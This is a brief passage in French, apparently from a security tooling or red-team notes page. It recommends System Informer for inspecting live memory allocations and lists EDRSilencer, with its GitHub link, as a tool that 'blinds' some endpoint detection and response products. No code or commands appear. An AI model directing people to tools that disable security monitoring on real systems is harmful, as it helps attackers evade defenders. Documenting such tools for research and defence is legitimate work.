2. Utiliser [System Informer](https://systeminformer.com/) (anciennement Process Hacker) pour analyser les allocations mémoire en direct.














## EDRSilencer

Permet de rendre aveugle certains EDR.

https://github.com/netero1010/EDRSilencer